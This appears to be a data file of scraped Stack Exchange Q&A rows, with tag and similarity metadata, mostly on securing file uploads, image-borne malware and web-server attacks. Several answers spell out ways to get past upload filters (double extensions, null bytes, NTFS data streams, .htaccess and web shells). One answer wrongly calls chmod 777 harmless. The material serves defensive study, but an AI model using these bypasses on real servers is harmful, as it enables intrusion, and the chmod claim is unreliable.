script that issues an   or   call to a bash script?  as far as i can tell environment variables like   don t get passed to exec ed shell scripts at least by default,0.028169014084507043,18,sse,bash|php|shellshock,shellshock attack scenario exploiting php,6,attacks|exploit|sanitization|vulnerability|bad practices|untrusted data,0.35158562660217285

65966,i think that the best approach would be to use a combined solution   scan the file using an antivirus  check the mime type of the file  perform the file size check that cristi described here  load the uploaded file into an image library and save it again you may be already doing this if you are resizing the images   by using all of these checks the possibility of a successful attack would a lot smaller   a good and popular practice is to check if the uploaded image is really an image and not something else validating an image is more secure than scanning with an antivirus  the  getimagesize  function will determine the size of any given image file and return the dimensions along with the file type and a height/width text string to be used inside a normal html img tag and the correspondent http content type the function supports many image formats  you can use   to accomplish multiple things at once    validate that the file is an image   only allow some image types  only allow desired sizes    determine the   of the image which can be used to deliver images with the correct http   header       and   are the width and height of the image     has the image type   note that mpeg videos are detected as    not a complete answer* but one way to filter out unwanted content would be to use php s image manipulation functions to transpose the uploaded image into a new image and then save that rather than the uploaded data a bit like taking a screenshot of a picture rather than just saving the picture directly  *= or the best solution or easiest..  this has been answered before on this site in extensive detail  see these questions    what are the security risks of letting the users upload content to my site?    is it necessary to scan users&#39 file uploads by antivirus?    antivirus for scanning anonymous file uploads    what steps should be taken to validate user uploaded images within an application?    what are security risks of serving user uploaded files without content-disposition?    why should i restrict the content type of files be uploaded to my site?    is it safe to store and replay user-provided mime types?    is it safe to serve any user uploaded file under only white-listed mime content types?    for general advice relating to web security owasp is always a good resource too  as christian says ithe best solution is to whitelist and verify the file type - however any file which has uncompressed metadata can potentially be an  avenue for attacking a webserver  strip the metadata  invoking the virus checker synchronously from the web request is a very bad idea in terms of performance stability and availability while the default upload handler in php sensibly puts files out of the way and forces you to move them before the request completes - this means that you ll have to copy the file once more after you virus scan it  best i can think for php is to re-create the image for example   then delete the originally uploaded image and keep your resized copy,2013-01-08 15:05:59,594,26690,i want my users to be able to upload a photo currently i am not checking the uploaded photo for problems of any kind although i do limit the size to 32k.is there any way for me to check uploaded image files for malware? for instance is there a server out there running clamav that i can access from php? thanks,0.02356902356902357,14,sse,antimalware|exploit|file-upload|malware|php,use php to check uploaded image file for malware,5,virus|owasp|exploit|attacks|antimalware,0.3484988808631897

1866,"it looks like you re only looking at the file extension  this is not effective  for a description of why and a list of viable protections please refer to  the owasp article on unrestricted file upload   excerpt  some of this may not be directly applicable to your environment but i m not editing those out.      using black-list for files’ extensions        some web applications still use only a black-list of extensions to  prevent from uploading a malicious file         it is possible to bypass this protection by using some extensions which are executable on the server but are not mentioned in the list.  example “file.php5” “file.shtml” “file.asa” or “file.cer”    sometimes it is possible to bypass this protection by changing some letters of extension to the capital form example “file.asp” or  “file.php3”    using trailing spaces and/or dots at the end of the filename can sometimes cause bypassing the protection these spaces and/or dots at  the end of the filename will be removed when the file wants to be  saved on the hard disk automatically the filename can be sent to the  server by using a local proxy or using a simple script example:  “file.asp .. ..   . ..” “file.asp ” or “file.asp.”    a web-server may use the first extension after the first dot “.” in the file name or use a specific priority algorithm to detect the  file extension therefore protection can be bypassed by uploading a  file with two extensions after the dot character the first one is  forbidden and the second one is permitted example “file.php.jpg”    in case of using iis6 or prior versions it might be possible to bypass this protection by adding a semi-colon after the forbidden  extension and before the permitted extension example:  “file.asp;.jpg”    in case of using iis6 or prior versions it might be possible to bypass this protection by putting an executive file such as asp with  another extension in a folder which ends with an executive extension  such as “.asp” example “folder.asp\file.txt” besides it is  possible to create a directory just by using a file uploader and ads  alternate data stream in this method filename should end with  “::$index_allocation” or “:$i30:$index_allocation” to create a  directory instead of a file example:  “newfolder.asp::$index_allocation” creates “newfolder.asp” as a new  directory    this protection can be completely bypassed by using the e.g control characters like null 0x00 after the forbidden extension and  before the permitted one in this method during the saving process  all the strings after the null character will be discarded putting a  null character in the filename can be simply done by using a local  proxy or by using a script example “file.asp%00.jpg” besides it  would be perfect if the null character is inserted directly by using  the hex view option of a local proxy such as burpsuite or webscarab in  the right place without using %    it is also possible to create a file with a forbidden extension by using ntfs alternate data stream ads in this case a “:” sign will  be inserted after the forbidden extension and before the permitted  one as a result an empty file with the forbidden extension will be  created on the server example “file.asp:.jpg” attacker can try to  edit this file later to execute his/her malicious codes however an  empty file is not always good for an attacker so there is an  invented method by the author of this paper in which an attacker can  upload a non-empty shell file by using the ads in this method a  forbidden file can be uploaded by using this pattern:  “file.asp::$data.”    in windows servers it is possible to replace the files by using their short-name 8.3 example “web.config” can be replaced by  uploading “web~1.con”  sometimes combination of the above can lead to  bypassing the protections           using white-list for files’ extensions        many web applications use a white-list to accept the files’  extensions although using white-list is one of the recommendations,  it is not enough on its own without having input validation there is  still a chance for an attacker to bypass the protections.   - the 3rd 4th 5th and 6th methods of last section apply here as well    - the list of permitted extensions should be reviewed as it can contain malicious extension as well for instance in case of having  “.shtml” in the list the application can be vulnerable to ssi  attacks",2014-03-07 21:02:29,769,52920,i am trying to pentest a webapp challenge is the following control code vulnerable to file upload? i would like to upload a php shell..  i am able to upload   file but i receive the error when i load the file location,0.04291287386215865,33,sse,file-upload|javascript|penetration-test|web-application,file upload vulnerability,10,owasp|bypass|pentest|attacks|protection|vulnerability|malicious file|malicious code|penetration test|input validation,0.3483485281467438

well not anymore..  if content was protected by permissions e.g web-server couldn t access before  the web-server might be able to access/list sensitive information .. not good if you didn t mean to share it different web-server configurations will also treat listings differently which can also expose more than is desired   in the above i also assume group to include the web-server principal and that there is a web-server and/or shared hosting involved which can be used as a primary attack vector and/or security vulnerability however and i stress this again  the list above is not complete   while not guaranteed safety using the most specific permissions can mitigate some vulnerabilities / exposure  if a malicious entry reaches your app website etc no matter what it does to the code the critical point is at the database and there is no possible protection against writing on it so chmod 777 permissions are nothing dangerous at all,2012-06-30 05:06:44.567 UTC,1121,11271596,i often read articles saying something along the lines of      chmod 777 is bad!   i was wondering  how do i become vulnerable when i execute   on a file?

66781,it is not possible to verify with certainty that an image is clean short of manually analyzing it to see if it conforms perfectly to the standards and that your image viewer likewise conforms to the standards instead you can encode the image between a simple format converting an image to a trivial format carries with it the risk of exploitation but converting from a trivial format to a more complex format does not you can exploit this reduced attack surface area for example    load the suspect image into a sandboxed image converter the image converter must not have any filesystem access  x11 access  or access to unnecessary syscalls the sandboxed image converter must be untrusted as it will be using potentially vulnerable libraries    have the sandboxed image converter re-encode the image into a trivial pixelmap format such as  ppm  the format must be simple enough that it would be infeasible to exploit the assumption is that this conversion process may compromise the converter so all subsequent steps must not need to trust this stage a pixmap is trivial enough for these purposes    a second unsandboxed image converter then takes hold of the pixmap e.g through shared memory this image converter is trusted as its only input will be a format so trivial that exploitation is infeasible the pixmap can then be converted into a more proper image format assuming of course you do not want the output to be a large uncompressed raw image    so why not just have a single sandboxed process convert the image? if you assume that the image parsing library for the input is vulnerable then even a sandboxed process can no longer be trusted if you ask it to convert a jpeg to a png and the jpeg is malicious it could embed a different exploit into the png output this is not going to be likely but it is possible making this a no-go  if this is overkill then there are still some other simpler ways to decrease the likelihood of falling victim to an image parsing exploit a non-exhaustive list of recommendations is    keep all your software up to date especially image libraries    verify that the image format matches the extension e.g by checking the  mime type     do not accept images from untrusted sources if possible    use only common image formats such as jpeg png and gif    images are collections of pixels those are usually harmless they can only be dangerous if they are malformated and the user uses an image viewing software which has a crucial security bug or if they are mistaken for an executable and someone tries to run them  an easy way which defeats most of these attacks is to re-encode any images on your server use a library on your server to decode the images to an in-memory array of rgba values and then re-encode those values to a new image in the same format that checks if it is actually a valid image file and should strip any junk data from it  however if you do this be aware that it opens up your server to potential attacks   the library you use to de- and encode the images might have vulnerabilities so make sure you use one with a good security track record  the image might be a  decompression bomb  most image formats use compression algorithms many compression algorithms allow to craft compressed files which generate a humongous amount of data if uncompressed or take a huge amount of computational resources to uncompress that can be used for resource exhaustion dos attacks so make sure you abort the image decoding if it starts to consume too much ram or takes more than a few milliseconds unless your image library already does that   it also has the side-effect that it won t just strip malicious metadata from the image files but also metadata which is beneficial like color profiles if you want to preserve certain kinds of metadata you need to take special care of that  there are a few questions to address here  firstly the real file type you need to check the file extension but that doesn t necessarily indicate the real file type you need to check the file type indicator - the magic bytes there are libraries for many development platforms to do this for you and you can read more about it  here   on virus scanning you can either run a scanning engine on a server and submit files to that or you can use an api like virus total there are a few issues to consider with sending the file out to an api   where is the api located? is it in the same country as you there may be data law restrictions on sending the file out to a scan engine in another country if those images may contain personal information like faces names email addresses etc  files uploaded to certain scan engines may be available to other people consider if this presents any problems for you or your users you can mitigate this by running your own  on-prem  system but this will require infrastructure to run and possibly incur additional licensing   the second consideration is when do you scan? if a user uploads an image do you scan on demand as soon as they attempt an upload? this will cause a delay in the upload but prevent any viruses getting into your file storage the alternative is to allow uploads without scanning first and have an agent that runs scanning files removing problem files as it goes it depends on the requirements you have,2018-03-15 09:41:41,1039,181594,i want to find out if it s possible to check if an image file like jpeg png gif or bmp is safe and don t have a virus in it  i want to filter an image file before i send them to sandbox to check if it s not suspicious and i know its safe file.the response from the sandbox takes 2-3 minutes and i want to reduce the time if i can filter some files that definitely clean  is there a method to find out if an image file is definitely safe,0.02021174205967276,21,sse,virus,how to check if an image file is clean,8,bomb|virus|exploit|attacks|vulnerability|attack surface|untrusted source|denial of service,0.33485811948776245

7368,i believe it might have to do with the path traversal attack which means someone might replace the relative path to that file with the relative path to another one which could be   another file from that server containing sensitive information so in this way they could have access to the contents of that file and they could read it  another file from a remote server and if the server that stores your application tries to load a file from the relative path you specified it will load instead this file from the remote server which could contain some malware or another form of attack   they could also use this vulnerability exactly for path traversal which means they would change that path to parent folders and so on upper in folders hierarchy and load every possible file they found there in this way they will gain information about absolutely every file you store on that disk  if someone tells you something is wrong then they must be able to tell you why its wrong and using relative links has no impact on seo with any of the major search engines at least for the last 10 years  if someone  infers  from the presence of relative urls in html that the service is vulnerable to path traversal attacks then they are in the wrong job    in the normal course of events these are converted to canonical paths in the client  it is considered good practice from a development point of view to use relative paths such that an application can be deployed in a multi-tenant vhost and for code management   i am not saying that the application is not vulnerable - but there is nothing in the question to support this assertion  while proving in a double-blind test that an application is  not  vulnerable to path traversal attacks it should be trivial for a competent systems admin to deliberately conitrive a staged scenario files with appropriate permissions in a known path outside the application path to test  relative urls can be vulnerable to  relative path overwrite   the main idea is that the client and the server will both parse the url differently so they might define the current directory differently  for example imagine you have a page located at   let s craft a simple url which will be parsed differently by the client and the server     the server will see   and   will parsed as the  path info  by an apache webserver it will define the current directory as    the client has no way to know that   is not a directory so it will define the current directory as     this allows you to redirect the intended location of a link or a source of a stylesheet / script allowing you to escalate to more advanced attacks like xss,2018-10-10 08:52:21,522,195441,i m currently reading a security audit of a web application where they rank relative paths in a web application as a security risk  e.g     i found several information on this topic regarding seo but i can t think of a scenario where this could be a security issue,0.03065134099616858,16,sse,html|web-application,relative paths in web applications,5,attacks|malware|vulnerability|path traversal|sensitive information,0.32773566246032715
43859,hmm having re-read this i cannot give you the solution you are after use systemd to kill them what we came up with is to simply ignore the processes but reliably not hang when the single process we were waiting for is done note that this is distinctly different from the pipes getting closed  another option not perfect but useful is to become a local reaper with prctl2 and pr_set_child_subreaper this will allow you to be the parent of all the processes that would otherwise reparent to init with this arrangement you could try to kill all the processes that have you as ppid this is terrible but it s the closest best thing to using cgroups  but note that unless you are running this helper as root you will find that practical testing might spawn some setuid thing that will lurk and won t be killable it s an annoying problem really  we had this problem with parallel tests in launchpad the simplest solution we had then - which worked well - was just to make sure that no processes share stdout/stdin/stderr except ones where you actually want to hang if they haven t finished - e.g the test workers themselves  use   instead of,2015-09-02 05:09:12.39 UTC,454,32345029,i need to run essentially arbitrary commands on a remote shell in ephemeral containers/vms for a test execution engine sometimes these leak background processes which then cause the entire command to hang this can be boiled down to this simple command   here the backgrounded   plays the role of a leaked process which in reality will be something like   and the echo is the actual thing i want to run the   should be considered as an atomic opaque example command here  the above command is fine and returns immediately as the shell s and also sleep s stdout/stderr are a pty however when capturing the output of the command to a pipe/file a test runner wants to save everything into a log after all the whole command hangs   now this could be fixed with some rather ridiculously complicated shell magic which determines the fds of stdout/err from   iterating over   and killing every process which also has the same stdout/stderr but this involves a lot of brittle shell code and expensive shell string comparisons  is there a way to clean up these leaked background processes in a more elegant and simpler way?   does not help   note that process groups/sessions and killing them wholesale isn t sufficient as leaked processes like dbus-daemon often setsid themselves  p.s i can only assume posix shell or bash in these environments no python perl etc  thank you in advance,0.013215859030837005,6,so,pipe|process|resource-cleanup|resource-leak|shell,shell clean up leaked background processes which hang due to shared stdout/stderr,1,resource leak,0.32737013697624207
62626,the segfault seems to be caused by the fact that matlab uses 64bits integers   or   in its bundled lapack and blas libraries armadillo on the other hand uses 32bits integers regular   on a 64bits platform or   by default  there are two solutions the first one involves forcing matlab to link to the system s libraries instead which use  s the second involves changing armadillo s config file to enable  s with blas i tend to think that the first is more reliable because there is no black-box effect but it s also more troublesome because you need to manually install and remember the path of your blas and lapack libs  both solutions required that i stopped using armadillo s shared libraries and linked/included manually the sources.to do this you must simply install lapack and blas on your system if they are not already there in ubuntu that s   and   and copy the entire   directory somewhere sensible like in   for example   solution 1 linking to system s libraries  from the matlab console set the environment variables   and   to point to your system s libraries in my case ubuntu 14.04 matlab r2014b   you can then compile normally   or if you define the flag   in   you can drop the option     solution 2 changing armadillo s config  the second solution involves uncommenting the flag   in armadillo s config file   matlab will link to its bundled lapack and blas libraries but this time armadillo won t segfault because it s using the right word-size same than before you can also uncomment   if you want to drop the    compiled with   in matlab   works without segfault  however compiled with   in matlab   causes a segfault  here armamex_demo2.cpp is,2015-02-10 00:14:48.813 UTC,377,28421934,i fiddled with this the whole day so i thought i might make everyone benefit from my experience please see my answer below  i first had a problem with running a compiled mex file within matlab because matlab complained that it couldn t open the shared library   i  solved this  using the environment variables   and     and   in osx   the problem remained however that a simple test file would segfault at runtime even though the exact same code would compile and run fine outside matlab not mex d,0.01856763925729443,7,so,armadillo|blas|lapack|matlab|segmentation-fault,armadillo + matlab mex segfault,1,segmentation fault,0.32699018716812134

67807,from my understanding it is not possible to force the server to run the code that you have uploaded due to the header being set server side however given you can upload anywhere code you want it may be worth seeing if you can view this file anywhere else whereby the code my actually be ran rather than downloaded  the only possible method that  could  potentially work is by injecting via the attachments file name itself e.g similar to header injection the what is file download injection of the following link might be useful: https://dl.packetstormsecurity.net/papers/attack/aspect_file_download_injection.pdf   i think the only thing you should keep in mind is that while the header forces the browser to download the file this doesn t prevent the asset from being included inside an actual page if a malicious user finds a way to inject it  as a for instance if the download url was something like this   and the server let references to it be injected directly into another page   it would still execute as normal javascript regardless of the   or just about any other header  i m guessing there is no good reason why the application directly injects uploaded files as javascript in which case the risk of it compromising the server seems minimal  there is however a minor increased risk of compromise to other user s on the server  if a malicious user finds a way to perform xss injection on the website the ability to host their javascript payload on the server itself would additionally allow them to circumvent any protection from any   settings  as a result xss injection becomes more dangerous  in reality though the biggest risk from what i understand about the system you have described is probably legal issues note ianal  if anyone can upload  anything to the server i imagine there are potential legal concerns to be aware of  the server you describe could effectively be used to distribute any information/files/content desired by anyone who has access to it especially if the service doesn t require authentication  what if happens if someone decides to use it to distribute child pornography?  that s an extreme example but sometimes such things are unfortunately relevant and there are plenty of less extreme examples that still cause problems  if it is an apache server you might be able to upload a .htaccess file enabling you to establish directory listings or specifying file extensions to run like php jsp py or whatever the server is able to understand  from there you will be able to upload a webshell or something else   by way of .htaccess configuration you may be able to change the server s behavior toward the uploaded files and bypass that attachment header imposition  in this  github repo  you will find some .htaccess-based attacks like shells rce traversals etc,2017-09-27 13:29:17,565,170238,i am testing web application which allows to upload files in every format without any restrictions there is also a function to download uploaded files but when i download file it is returned with header  content-disposition attachment filename=test.html   so it will not open in browser  how this vulnerability can be exploited? is it possible to use this bug to execute xss?  without this header it will open in the browser so it would be enough to upload html file containing script is it possible to perform similar attack in this case,0.021238938053097345,12,sse,file-upload|penetration-test,pentesting file upload functionality,8,bypass|pentest|exploit|attacks|protection|vulnerability|penetration test|cross site scripting,0.3259231448173523

 the more information you decide to strip from your image the more likely you are to unintentionally lose some information you later need if you strip the exif data you will no longer know when the image was shot or where or by whom if you strip the icc colour profile your image may appear washed out or over-saturated or green in some viewers if you strip the iptc information you may be committing a licence-infringement if you are required by contract to retain it if you strip the geo-referencing information your data may become useless if you strip the comments you may lose masking information or copyright or tagging information if you change the format from png/tiff/gif to jpeg you will lose transparency and accuracy if you change from tiff to png you will lose the ability to store 32-bit 64-bit or floating point data and more than 4 channels if you change from jpeg to png you may inadvertently make the file many tens or hundreds of times larger  so pretty much the most paranoid action you could take would be to load the bitmap into memory  save it preferably in memory rather than to disk for performance reasons in a format that is incapable of storing anything other pixel data e.g ppm or raw rgba bytes and re-save it as your jpeg or png that will discard all exif/iptc/geo-data and comments as well as any tacked on extraneous data at the end or in the middle of the image if you want a concrete example you could use the following  imagemagick  command in terminal   if you were using pil/pillow and python you could do   if your image is in png format though you have added complications - it may be a palette image and it may have alpha/transparency information and you will likely want to retain that that might look like this   if you need to preserve some meta-data you will need to consider other options,2019-12-18 20:51:02,843,59399809,i ve read that .png .jpeg and other image file types can potentially contain malware  i am looking to remove potential malware embedded in user-uploaded images is there a way in python to essentially flatten an image that would essentially remove any malicious content?

7755,a dangerous code present in a file can be ran no matter where the file resides but if the file is non-exe/script one like a text then there must be something else infiltrated to be able to execute the content  advanced attacks can store the file pretty much anywhere run code from there and then remove the initial file doing that in-memory leaves a lot less traces compared to saving it to a drive  if the file is in any type of executable format then things are easier since nothing else is required to activate the content  if you do protect yourself against csv injections note make sure not to have equals to “=” plus “+” minus “-“ at “@” at any cell beginning you should be fine from that side but that would not prevent someone from putting code in a .csv that actually looks harmless but if correctly assembled makes up a script ran later so you should also make sure there s no possibility for something to be in already and able to interpret / run further data if there is no way for anyone to access anything except doing that csv upload then this should not be a vulnerability  if parsing and storing fragments in the database is the only thing you do i can think of the following attack scenarios     attacking the parser :an attacker could use unexpected ascii/unicode-chars or bytes and try to derail your flow of execution during the parsing process     attacking the dbms with file content  an attacker could store values in the csv that might once parsed cause sql-injection upon insertion to the database    howeever defense should be quite similar in both cases   input validation :the received file has to be considered as malicious input your parser has to validate strictly while failing softly if something unexpected shows up in the csv implementing a whitelist approach of allowed chars and restricting to an absolute minimum should be a good idea,2019-03-07 02:20:25,628,204900,i m curious to know if there are any significant threats presented by files which are uploaded and read but are never saved to disk?  i ve read countless articles about file uploads regarding storage and retrieval of the file itself but i haven t found any information on simply keeping the file in memory  my specific situation is as follows  i have an http endpoint which will accept csv files from users  for a file to be accepted it must be in a predetermined format and encoding  the file bytes will be read and converted to a csv oop model which will then verify valid characters and persist the values not the csv file to a database via parameterized queries i realize that this is a form of persistence to disk but in this scenario the data would be sanitized/verified by this point  any invalid character markup code invalid whitespace etc in the byte stream will cancel the entire process and return an error  any invalid/unknown csv field will cause the same cancellation/error  it seems that most of the risks with file uploads are associated with the file s permissions on disk surreptitious contents intended for execution and the like  all of which involve the file being persisted as-is or approximately so and then handled by the os/runtime in some exploitable way  if a file is only read into memory from the network and then garbage collected what vectors might an attacker exploit?   update 2109-03-07  this question states erroneously on my part that the parsing would occur  before  checking characters against whitelist  in the actual scenario characters are checked before parsing  leaving the original scenario as-is to maintain the context addressed by euphrasius,0.027070063694267517,17,sse,attack-prevention|attack-vector|csv|file-upload,file upload attack vectors when file is not saved to disk,9,attacks|exploit|protection|sanitization|attack vector|vulnerability|sql injection|input validation|attack prevention,0.31348785758018494

38248,first of all the distinction you make between packers and archiver programs zip etc or compression programs doesn t appear to have any basis  a packed executable cannot be executed directly  it must be unpacked first  this is exactly the same as say a zip file containing malware or a malware file that has been compressed with a standard compression program  what about a packed executable that has been created by a program that does the packing in a secret way .. to evade detection?  well that won t work  the malware still has to be unpacked before it can be executed  so that means that the bad gut now has a second problem getting the unpacker onto the victims machine  and once someone an anti-hacker gets hold of the super-secret unpacker it is no longer secret  it can be reverse engineered .. or simply used as-is by an av product on suspicious binary files  the only practical use of packing that i can think of is to add self-unpacking functionality to the malware  the malware as distributed would consist of an executable with a small amount of code that implemented the unpacker  the rest of the executable would be packed code that implements the nasty stuff  when the user runs the malware it would unpack the packed code load it into memory and start executing  however there are potential ways to detect or prevent this kind of thing     if the unpacker writes the executable code into a file prior to loading it an av product could detect that   if the packer attempts to load code into itself there are ways that could be blocked e.g using memory protection hardware + the os etc to stop the unpacker from creating memory segments containing executable code see  https://en.wikipedia.org/wiki/executable_space_protection   an av could look for the signature in the packed code or it cold look for a signature in the unpacker code    in short malware  could  use some kind of packing to hide itself but there must be an executable component somewhere to  unpack  it      if so how can we say that these binaries are packed or not?     if the malware is distributed as a non-executable you figure out what is going to unpack it and then see if that process is going to give you an executable    if the malware is a self-unpacking executable you reverse engineer the unpacking component to figure out how it works,2019-05-19 12:28:49.293 UTC,521,56207828,recently i m reading malware analysis i m going through this malware repository  https://github.com/ytisf/thezoo  here we can find malware binaries can binaries be in packed form? if so how can we say that these binaries are packed or not?   ps  packers compress a program and will try to hide internals from ussort of compression or encryption i got a doubt regarding this can binaries be in the packed form or not?   edit2  in this repository they just zipped it to be safe which is not actual packing i m talking about after unzipping we will get a binary whether that can be in packed form or not,0.03262955854126679,17,so,binaries|malware|malware-detection,can malware binaries be in packed form,2,malware|protection,0.28602758049964905

66678,"much more common than a buffer-overflow type bug that @zian mentions though i think there was a wmf vuln of this sort in windows as recently as 4-5 years ago is something like  gifar  also search on so a file that is both a valid image file e.g gif and a valid zip file e.g jar compiled java bytecode this is possible because of the way these formats store their headers specifically they are not mutually exclusive   so you can have a file that passes all validity checks you do and yet when it is displayed in the browser the java code is executed because well you just downloaded a valid jar file dincha?     to the best of my knowledge this has been fixed by the major vendors but i admit i m not really up to date the original discoverer of gifar can be found  here .  such an attack relies on the image parser containing a bug that allows the execution of what would otherwise be a slightly wacky picture  for example instead of red being interpreted as a color the computer may try to interpret it as a shell command  from comments to question i understood that one might be interested to get into details of  executable images  oops image collides with a copy of a disk let say  pictures that are excutable/runnable scripts or programs which look to humans as images pictures and to computer as executable scripts programs   video  defcon 15 - t312 - the executable image exploit      the text to above video as pdf slides     php script check validate if the uploaded file is an image    update here is one more reference on how to embed a virus php javascript actionscript etc. code into an image    code injection – a simple php virus carried in a jpeg image    i assume when you say image you mean something like a jpeg or a gif  the answer is that older software has bugs such that when they display the image they can get confused for example images have comment fields inside them that are usually not displayed but can contain things like the gps coordinates of the iphone camera that took the picture typical software expect that these comments will never exceed 100 characters but a hacker can do something ridiculous like making a 10,000 character comment software should safely reject this but some don t they have a bug where these unexpected characters overflow into other areas of memory if the hacker crafts those 10,000 bytes just right he can cause the buggy software to run code  just because we humans expect those comments to be short english text doesn t stop the hacker from putting in long executable code into those fields  there are a lot of different pieces of code that might have such bugs from mspaint to internet explorer to microsoft word they all use different code to do the same thing and they all have different bugs that s why you should keep your software up-to-date so that when new bugs are discovered these corrupted images won t affect you",2010-11-21 00:30:14,552,600,what exactly happens when someone injects malicious binary code into an image file on windows? how is that done,0.016304347826086956,9,sse,binary-code|exploit|file-types|virus,what is the corrupted image vulnerability? how does it work,6,virus|exploit|attacks|vulnerability|code injection|buffer overflow,0.28464120626449585

 exploits of this type are both rare and hard to do the general risk is the same as uploading and downloading jpegs or pngs indeed it s a bit smaller there was indeed an exploit of this type affecting commonly-used jpeg libraries for a while   in all just make sure you only output with the content-types you accept and force file-extensions to match them if the user uploads a video/mpeg called hahaha.exe then rename it hahaha.mpg  edit oh also  malicious scenario 3  uploader uploads video that exploits some players in a way that uses a lot of resources in this case a downloader will just kill-9/ctrl-alt-delete/your-oss-kill-them-all-of-choice but if your server is testing it s a video then it could end up in trouble as there s no one on hand to step in and kill the 200 and growing as the script-kiddies s script keeps uploading more videos it s trying to interpret  just doing normal video-processing could be enough to introduce the ability to dos you video processing is relatively heavy after all so testing the file could introduce more dangers than it saves you from  i agree that unless video players have a issue that can be exploited via some corrupted video files i won t worry much but say for not necessarily security reasons one had to check whether the file you have is a video file and all of it is valid you could execute the following steps   run ffprobe on the file without arguments it will give some information about the file the codecs containers duration frame rate bitrate  now run ffprobe with -show_packets it should give out frame by frame information about the file you should get as many video frames as duration*frame_rate given by the first command this can be checked because someone could just give a crafted header or initial section of the file could be valid video ffmpeg and ffprobe will only test the first few seconds of the video to verify its type the rest could be corrupted  run ffprobe with -show_frames this will try and decode headers of each frame to ensure each one is a valid video frame this is an additional step because some container simply have a table that can be used for show_packets hence ffprobe could have simply read that table and the data it is pointing to may be corrupt   now it is theoretically possible that a file has all valid headers for every frame but wrong data but without decoding the actual content and viewing it on a player this is the best you can do afaik and i would say that is good enough and it is very fast  users can safely upload anything as long as it goes to the right directory and nothing on the server tries to run it and if it s supposed to be a video nothing will try malware can t do anything unless the victim somehow activates it  you can call   via a php extension   https://github.com/char0n/ffmpeg-php/   which essentially wraps the output of   which you then can check in php however you should familliarize yourself with  ffmpeg  first which is a whole topic on its own if you don t want to use the library you can execute ffmpeg on your own via  exec   additionally i would check the mimetype you can also check the file on the client side within a file input via js not in all browsers and this is  no  replacement for a true validation  lg  flo,2012-08-07 17:23:52.723 UTC,953,11851016,i have a server that has some very sensitive information on it so security is a big issue the user needs to be able to upload a video i know allowing users to upload files poses a security threat because there is no 100% way to keep them from uploading non-videos but i obviously can choose which files the server will keep  i know that checking the file-extension won t suffice checking the mime type is better but it can still be faked so how do i go about checking if the file is a video,0.01888772298006296,18,so,php|php-5.3,how do i validate that an uploaded file is a video,7,trojan|exploit|malware|vulnerability|buffer overflow|denial of service|sensitive information,0.26998937129974365

279,the simplest would be a executable upload vulnerability   the set-up scenario would be that a site allows users to upload files to the site say images that the users might want to attach to forum posts they create   if there aren t security measures and the files that the users are allowed to upload live in a web-accessible executable location there is the potential for a malicious user to upload something like a *.php or *.asp file instead with code that will be run when the user navigates to the uploaded file    the high value attacks are ones that get a root shell on a server at that point you can run whatever you like   one step down from that is an attack which uses functionality within a web app to gain a shell which can be escalated to root sometimes that escalation is through uploading an executable to user space which gains privilege through an exploit   here is a great book for you   hacking the next generation   it illustrates many examples of how attacks are executed.if the server hosts an app that does not restrict uploaded files types for example a malicious user can upload a shell there are many of these and run it over http most of those shells allow privilege escalation so if the server is not updated/patched the attacker will have root access on the server i ve seen this happening many times mainly in cheap web-hosting  you can also think about any shell code exploit think that the webserver can have some vulnerability that allows someone to cause a buffer overflow and using it he can inject some code that will give him access to the shell  since the webserver is one application it might be vulnerable to this kind of attack for example  in this thread  someone complains about being attacked by a shellcode through his webserver  three very common webserver attacks would be  cross-site scripting  attacks and  sql injection  attacks and  directory traversal attacks  maybe the most common  all of these are very similar and if successful are the result of poor input validation  while these may not actually put the physical server itself at risk there are more painful things than losing a server  like losing a database full of financial processing information or pii  input validation is probably the single most important thing for web application developers to understand  even a very simple app like a script that makes files available for viewing or download can put you at risk if you re passing files with a path to a script to cause the file to be downloaded or viewable and you don t do any sanitizing on the paths to ensure for example that they are relative and within the document_root then you could end up with a webserver that would be quite happy to display your /etc/shadow file or your iptables configuration or anything else that lives in a file on your server  to be able to run code on your server i could   upload a file using one of your web forms but instead of an image i upload a php file then i can run the code in the php file with the privileges of the webserver process  exploit a buffer overflow to get a shell on your server  log in as an administrator and upload code:  social engineer the password from one of your administrators  use an xss attack to steal session cookies from one of your administrators  use an sql injection attack to read the password table then:  read the passwords that you stored in cleartext or  run a password guessing program to crack your poorly chosen passwords    use a directory traversal attack to get a copy of your system password file and use one of the password-cracking methods mentioned above  physically steal a backup tape to get a copy of your database and use one of the password-cracking methods mentioned above    use any of dozens of methods of taking over a machine on your intranet and using that as a platform to upload code to the web server  physically get myself in front of your server console   note that i don t necessarily have to attack your app i can attack vulnerabilities in your webserver os or people for example,2011-11-14 14:24:16,826,8873,i hear stories about insecure web servers and sites which people or bots break into and execute their own code on the server  my question is how is that possible? i heard of people putting their own javascript on websites stealing cookies and techniques how to do that i never heard of actual attacks to execute code i know mysql injections can be used to steal data and put in javascript code on pages but i am still having trouble thinking of how the weakness of a site can compromise a server how is that possible,0.04600484261501211,38,sse,web-application,what are web attacks which users can run code on your servers,11,attacks|exploit|weakness|sanitization|sql injection|vulnerability|buffer overflow|input validation|directory traversal|privilege escalation|cross site scripting,0.2633163034915924

   is it saved to disk and used locally? in this case you should have some form of anti-virus check it if only for your benefit - if you believe in them you can just have the local av engine scan it   is it later returned to other users and thus can use your system for spreading? you should definitely have some form of av scan before saving the file note that this may not be as simple since you might be storing the images in your database there are av scanners that can be activated by api for a memory segment before it gets saved to file.. in any event i am categorically opposed to running antivirus scans directly on your actual systems you d be better off having some form of gateway av scanner before it even hits your system    however take into account that when you allow random users to upload arbitrary files virus cleaning is not the utmost of your worries       for one you can be swamped - either by huge files or many smaller ones thus dosing your server     if the user can specify the saved file path - he could potentially overwrite system files or upload executable code     if file attributes are saved and later displayed this includes file name and username but also description file type location etc - this can lead to other standard web attacks such as xss or sql injection     do a search here for gifar - these are files that are both valid image files and valid jar java archive - executable code for the browser files these are of course not a virus..   depending on the system you may be at risk for legal damages if your users upload e.g copyrighted images or e.g child pornography  of course consult with your lawyer as i am not one    tl;dr  in short accepting arbitrary uploads does lead you into a whole mess of potential trouble and virus scanning is not the worst of it,2012-02-21 18:01:07,871,11986,after reading the data from the request as stream i needed to convert it to image so i used this method   so while im unable to know what was in that inputstream file format is done already but still.. there may be a virus or malware so in that case fromstreamstream would throw argumentexception since it s not an image  my question is - if the file uploaded contains a virus and the method throws an exception while trying to convert the stream to image:did that make any harm to the server?if so how to avoid it?what should be the scenario for handling file upload in the server?im just wondering rather or not i need to scan for viruses in the scenario of photo-uploading,0.03444316877152698,30,sse,.net|asp.net|file-upload,c# image.fromstream is that secure,11,virus|malware|attacks|protection|vulnerability|sql injection|untrusted data|buffer overflow|untrusted source|denial of service|cross site scripting,0.26158860325813293
